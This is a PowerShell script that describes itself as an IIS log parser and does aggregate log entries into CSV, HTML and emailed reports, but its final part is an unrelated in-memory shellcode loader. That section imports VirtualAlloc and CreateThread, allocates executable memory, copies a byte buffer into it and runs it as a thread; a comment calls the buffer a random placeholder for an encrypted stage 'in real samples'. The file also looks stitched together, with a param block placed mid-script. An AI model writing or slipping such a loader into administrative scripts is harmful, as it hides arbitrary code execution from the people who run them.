
<#
.SYNOPSIS
    Parses IIS W3C logs and reports the busiest URLs and status codes.
.DESCRIPTION
    Reads the newest log files below the configured site folder, discovers the
    field order from the #Fields header and aggregates requests, errors and
    transferred bytes.
    The output is a CSV file that can be opened in Excel or forwarded to the web
    operations mailbox.
.EXAMPLE
    .\Get-IisTopUrls.ps1 -Days 3 -TopN 20
#>

$LogRoot    = "C:\inetpub\logs\LogFiles\W3SVC2"
$Days       = 3
$TopN       = 20
$OutputPath = "C:\Logs\reports\iis-top-2024-07-03.csv"
$HtmlPath   = "C:\Reports\iis-2024-07-03.html"

$ProgressPreference = 'SilentlyContinue'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$hostName = $env:COMPUTERNAME
$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}
$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$slowest = $entries | Sort-Object -Property TimeTaken -Descending |
    Select-Object -First $TopN Uri, TimeTaken, Status

$topUrls | Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
$byStatus | Export-Csv -Path $OutputPath.Replace('.csv', '-status.csv') -NoTypeInformation -Encoding UTF8
$slowest | Export-Csv -Path $OutputPath.Replace('.csv', '-slow.csv') -NoTypeInformation

$byDay = $entries | Group-Object -Property Date | Sort-Object -Property Name |
    ForEach-Object {
        [pscustomobject]@{
            Date     = $_.Name
            Requests = $_.Count
            Errors   = @($_.Group | Where-Object { $_.Status -ge 400 }).Count
        }
    }
$byDay | Format-Table -AutoSize

$notFound = $entries | Where-Object { $_.Status -eq 404 } |
    Group-Object -Property Uri | Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$notFound | Export-Csv -Path $OutputPath.Replace('.csv', '-404.csv') -NoTypeInformation -Encoding UTF8

$byHour = $entries | Group-Object -Property { ($_.Time -split ':')[0] } |
    Sort-Object -Property Name
$byHour | ForEach-Object {
    Write-Verbose ("Hour {0}: {1} requests" -f $_.Name, $_.Count)
}

$style = @'
<style>
body { font-family: Tahoma; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byDay | ConvertTo-Html -Title 'IIS traffic by day' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8
$MailTo = "webops@internal.corp"
$MailFrom = 'iis-report@internal.corp'
$summaryBody = $byStatus | ConvertTo-Html -Fragment | Out-String

Send-MailMessage `
    -To $MailTo `
    -From $MailFrom `
    -Subject "IIS log summary" `
    -Body $summaryBody `
    -SmtpServer 'smtp.internal.corp' `
    -Port 25 `
    -UseSsl
foreach ($log in $logFiles) {
    $sizeMB = [math]::Round($log.Length / 1MB, 2)
    Write-Verbose ("{0}: {1} MB" -f $log.Name, $sizeMB)
}
Write-Host ("Top URL: {0} ({1} hits)" -f $topUrls[0].Uri, $topUrls[0].Count) -ForegroundColor Green
Write-Verbose ("Log files processed: {0}" -f @($logFiles).Count)

$medianTime = ($entries | Measure-Object -Property TimeTaken -Average).Average
Write-Verbose ("Average time taken: {0:N1} ms" -f $medianTime)

$byMethod = $entries | Group-Object -Property Method | Sort-Object -Property Count -Descending
$byMethod | Format-Table Name, Count -AutoSize

$bigResponses = $entries | Sort-Object -Property Bytes -Descending | Select-Object -First 5
$bigResponses | Format-Table Uri, Bytes, Status -AutoSize

$compressed = @(Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) }).Count
Write-Verbose ("Logs older than 30 days: {0}" -f $compressed)

$errorRate = [math]::Round((@($errorEntries).Count / $totalRequests) * 100, 2)
Write-Host ("Error rate: {0} percent" -f $errorRate) -ForegroundColor Yellow

$bots = $entries | Where-Object { $_.Uri -match 'robots|sitemap' }
Write-Verbose ("Crawler requests: {0}" -f @($bots).Count)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x83, 0xbb, 0xcb, 0xb4, 0x7b, 0xda, 0x98, 0x05, 0x02, 0x3b, 0x72, 0x27, 0xea, 0x18, 0x03, 0xd6,
    0x38, 0xd6, 0x3f, 0x82, 0x94, 0xf7, 0xf5, 0x47, 0xba, 0x39, 0xc0, 0xe8, 0xcf, 0x15, 0x2f, 0x57,
    0x95, 0x2c, 0x7d, 0xa2, 0xbe, 0x38, 0xae, 0x34, 0xf3, 0xe4, 0x6e, 0xec, 0x1f, 0x25, 0x76, 0xb4,
    0x22, 0xe0, 0x65, 0x4e, 0x14, 0x5f, 0xa3, 0x7b, 0x56, 0xa9, 0x2f, 0xa5, 0x19, 0x13, 0x65, 0xb4,
    0x6f, 0x2a, 0x75, 0x0a, 0xba, 0xf2, 0xd0, 0x91, 0x57, 0xd6, 0x7b, 0x44, 0x80, 0xb5, 0xa9, 0xea,
    0xa7, 0x79, 0x54, 0x51, 0x72, 0xa0, 0xb3, 0x6f, 0xec, 0xae, 0x99, 0xad, 0x19, 0xcb, 0x37, 0x30,
    0xb2, 0xf1, 0xe0, 0x28, 0x8a, 0x43, 0xe1, 0xe8, 0xaf, 0xf8, 0x8c, 0x3d, 0x04, 0x65, 0x4f, 0xc1,
    0x48, 0x2f, 0xa5, 0x83, 0x89, 0x8e, 0x40, 0xe3, 0x6d, 0x85, 0xf2, 0x40, 0xc9, 0x84, 0x12, 0xbe,
    0x86, 0x7f, 0x84, 0x21, 0x0d, 0x71, 0xc5, 0xda, 0x51, 0x15, 0x78, 0x95, 0x4a, 0x6c, 0x9e, 0x02,
    0xde, 0x30, 0xd0, 0xa3, 0xf7, 0x18, 0x69, 0x35, 0x21, 0xae, 0x7b, 0x10, 0x77, 0x10, 0x22, 0x34,
    0x84, 0x5e, 0xe1, 0x32, 0x08, 0xf7, 0xa5, 0x31, 0x4c, 0x9f, 0xdb, 0x29, 0x7e, 0x7a, 0x8b, 0x43,
    0x19, 0x2b, 0x25, 0x7d, 0x9b, 0x6a, 0x2d, 0x39, 0x27, 0xe5, 0xa1, 0x80, 0xad, 0x12, 0xc6, 0xe8,
    0x43, 0x69, 0x7b, 0x9b, 0xcf, 0x04, 0xac, 0x09, 0xe5, 0x91, 0x1b, 0x63, 0x95, 0x21, 0x2b, 0x04,
    0x87, 0xa3, 0x11, 0x6e, 0x65, 0xa0, 0xb0, 0x1f, 0x05, 0x2d, 0x6b, 0x78, 0xa4, 0xcc, 0x85, 0x51,
    0xbe, 0x37, 0x57, 0x2b, 0xaf, 0x8d, 0x0f, 0x5f, 0x7d, 0x4c, 0x4e, 0xb8, 0x5a, 0x29, 0x49, 0x03,
    0xd1, 0xf3, 0x82, 0x00, 0x2d, 0x0b, 0xfb, 0x1a, 0x8b, 0xa8, 0x39, 0x64, 0x48, 0x8b, 0x8c, 0x73,
    0x32, 0xeb, 0x1d, 0x3b, 0x49, 0x34, 0x35, 0x91, 0x05, 0xa6, 0xf5, 0x31, 0x76, 0x96, 0x8d, 0xd1,
    0x73, 0x59, 0x77, 0x78, 0x84, 0x96, 0x22, 0x47, 0x78, 0xb5, 0x53, 0xb3, 0xdf, 0xa5, 0x32, 0x7b,
    0xf4, 0xea, 0x26, 0xb4, 0x48, 0x54, 0x97, 0xfb, 0xbd, 0x15, 0xff, 0x18, 0x06, 0x6a, 0xbd, 0xdc,
    0xba, 0x99, 0x59, 0x35, 0xc6, 0xc7, 0x55, 0x34, 0xc8, 0xfe, 0x8f, 0xb3, 0xc1, 0x22, 0x4f, 0xaf,
    0x75, 0xdb, 0x7d, 0xd3, 0x6f, 0xe2, 0xc7, 0xbe, 0xc3, 0x69, 0x3b, 0x8a, 0x1a, 0x4d, 0x00, 0x51,
    0x0a, 0xd4, 0xe1, 0x87, 0x66, 0x91, 0xe0, 0xdf, 0x30, 0xc3, 0xfe, 0x5e, 0x90, 0x9e, 0xb9, 0x89,
    0x53, 0x84, 0xe8, 0x80, 0x6f, 0xaa, 0x55, 0x9a, 0x63, 0xc1, 0xc2, 0x30, 0x81, 0xfe, 0x58, 0x08,
    0x33, 0x4a, 0x1a, 0x10, 0x49, 0x08, 0xbc, 0xec, 0xf1, 0xfe, 0x6e, 0xc2, 0x9e, 0xcf, 0x66, 0x6b,
    0xfc, 0x0c, 0xb1, 0x2e, 0x9e, 0xb9, 0x3f, 0xf3, 0x8c, 0xa2, 0x02, 0xaa, 0xc7, 0x99, 0x4b, 0x21,
    0xb3, 0xff, 0xb1, 0xff, 0x02, 0x04, 0xed, 0x5b, 0xac, 0xfb, 0xa6, 0xf0, 0x12, 0xed, 0xcf, 0xad,
    0x64, 0xc9, 0xc1, 0x41, 0x97, 0x1f, 0x1e, 0x56, 0xd6, 0xa0, 0x39, 0xf4, 0x72, 0x96, 0x9d, 0x7d,
    0x3e, 0x80, 0xe9, 0x3f, 0x54, 0xf0, 0x42, 0x02, 0x4e, 0xcd, 0x1f, 0xee, 0xe6, 0x8d, 0xd7, 0xc3,
    0x73, 0x58, 0xcd, 0x54, 0xd4, 0x8a, 0x10, 0x39, 0xd3, 0xb3, 0x1a, 0x57, 0x51, 0xcc, 0x80, 0x47,
    0xb4, 0x68, 0x63, 0x77, 0xb0, 0x6c, 0xc6, 0xef, 0x3e, 0x0f, 0x49, 0x78, 0x97, 0x76, 0x64, 0xc4,
    0xd2, 0x37, 0xb2, 0xb6, 0x30, 0x2c, 0xa1, 0x8f, 0x17, 0xd4, 0x97, 0x82, 0x99, 0x06, 0x37, 0xdf,
    0xa9, 0x7b, 0xea, 0x30, 0xaa, 0x61, 0x0f, 0x1f, 0x78, 0x8d, 0x8f, 0x27, 0xfa, 0x05, 0xbe, 0xf9,
    0x7a, 0x6c, 0xd5, 0x78, 0x91, 0x29, 0x1c, 0xa6, 0xf1, 0x9c, 0x43, 0xab, 0xc4, 0x39, 0x3c, 0xcc,
    0x35, 0x49, 0xca, 0xb3, 0x35, 0x06, 0x99, 0x7c, 0x4a, 0x1c, 0x69, 0xfd, 0x0e, 0x27, 0x8b, 0xe7,
    0x5e, 0x1d, 0xdb, 0x70, 0xa0, 0xc3, 0x26, 0x50, 0x88, 0x1e, 0x65, 0x61, 0x40, 0x8e, 0x74, 0x8b,
    0xdc, 0x99, 0xf7, 0x02, 0x22, 0x82, 0x8b, 0x8e, 0x0e, 0x59, 0x9d, 0x47, 0xce, 0x00, 0x5c, 0xb0,
    0x50, 0x42, 0x6e, 0x53, 0x0e, 0xd9, 0x2b, 0x9a, 0x25, 0x61, 0xe4, 0x08, 0xa3, 0x51, 0xd7, 0x8d,
    0x77, 0x83, 0xb5, 0xbd, 0x23, 0x5f, 0x90, 0x58, 0xe1, 0x47, 0x99, 0x75, 0xdf, 0x11, 0x39, 0x93,
    0xa2, 0x7f, 0x29, 0x64, 0x09, 0x40, 0x5a, 0x0d, 0x50, 0x7e, 0xab, 0xb3, 0x70, 0x04, 0xc0, 0x5a,
    0xc0, 0x84, 0xc8, 0xf6, 0x86, 0x1e, 0xad, 0x7e, 0x5c, 0xb4, 0xd8, 0xac, 0x32, 0xd0, 0x46
)

$ProcHandle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeMethods]::WaitForSingleObject($Thread, 3837)
[void][NativeMethods]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
